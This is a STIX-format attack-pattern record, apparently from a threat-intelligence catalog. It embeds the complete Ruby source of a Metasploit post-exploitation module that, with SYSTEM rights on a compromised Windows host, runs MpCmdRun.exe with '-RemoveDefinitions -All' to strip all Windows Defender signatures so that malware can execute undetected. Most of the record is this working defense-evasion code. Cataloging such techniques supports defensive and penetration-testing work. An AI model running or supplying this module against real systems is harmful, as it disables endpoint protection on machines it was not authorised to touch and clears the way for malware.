{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2e63194c-c58b-4bcf-8bb1-7029174b0826",
    "created": "2024-08-14T16:33:04.967321Z",
    "modified": "2024-08-14T16:33:04.967325Z",
    "name": "Disable Windows Defender Signatures",
    "description": " This module with appropriate rights let to use the Windows Defender command-line utility a run and automation tool (mpcmdrun.exe) in order to disable all the signatures available installed for the compromised machine. The tool is prominently used for scheduling scans and updating the signature or definition files but there is a switch created to restore the installed signature definitions to a previous backup copy or to the original default set of signatures which is none, disabling all the signatures and allowing malware to execute even with the Windows Defender solution enabled.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/rollback_defender_signatures.rb",
            "external_id": "rollback_defender_signatures.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Disable Windows Defender Signatures',\n        'Description' => %q{\n          This module with appropriate rights let to use the Windows Defender command-line utility a run and automation\n          tool (mpcmdrun.exe) in order to disable all the signatures available installed for the compromised machine.\n          The tool is prominently used for scheduling scans and updating the signature or definition files,\n          but there is a switch created to restore the installed signature definitions to a previous backup copy or\n          to the original default set of signatures which is none, disabling all the signatures and allowing malware\n          to execute even with the Windows Defender solution enabled.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'metasploit@[at]csiete.org',\n          'luisco100 <luisco100[at]gmail.com>'\n        ], # Module author\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Actions' => [\n          [ 'ROLLBACK', { 'Description' => 'Rollback Defender signatures' } ],\n          [ 'UPDATE', { 'Description' => 'Update Defender signatures' } ]\n        ],\n        'DefaultAction' => 'ROLLBACK',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_config_getenv\n            ]\n          }\n        },\n        'Notes' => {\n          # if you rollback the signatures, that resource is lost\n          'Stability' => [SERVICE_RESOURCE_LOSS],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n  end\n\n  def run\n    # Are we system?\n    if !is_system?\n      fail_with(Failure::NoAccess, 'You must be System to run this Module')\n    end\n\n    # Is the binary there?\n    if client.arch == ARCH_X86 && client.arch != sysinfo['Architecture']\n      program_path = session.sys.config.getenv('ProgramW6432')\n    else\n      program_path = session.sys.config.getenv('ProgramFiles')\n    end\n    vprint_status(\"program_path = #{program_path}\")\n    file_path = program_path + '\\Windows Defender\\MpCmdRun.exe'\n    vprint_status(\"file_path = #{file_path}\")\n    if !exist?(file_path)\n      fail_with(Failure::NoAccess, \"#{file_path} is not Present\")\n    end\n    # Is defender even enabled?\n    defender_disable_key = 'HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender'\n    disable_key_value = meterpreter_registry_getvalinfo(defender_disable_key, 'DisableAntiSpyware', REGISTRY_VIEW_NATIVE)\n    unless disable_key_value.nil? || disable_key_value != 1\n      fail_with(Failure::NoTarget, 'Defender is not enabled')\n    end\n\n    case action.name\n    when 'ROLLBACK'\n      print_status('Removing all definitions for Windows Defender')\n      cmd = \"cmd.exe /c \\\"#{file_path}\\\" -RemoveDefinitions -All\"\n    when 'UPDATE'\n      print_status('Updating definitions for Windows Defender')\n      cmd = \"cmd.exe /c \\\"#{file_path}\\\" -SignatureUpdate\"\n    else\n      fail_with(Failure::BadConfig, 'Unknown action provided!')\n    end\n    print_status(\"Running #{cmd}\")\n    output = cmd_exec(cmd).to_s\n    if output.include?('denied')\n      print_bad(output)\n    else\n      print_status(output)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}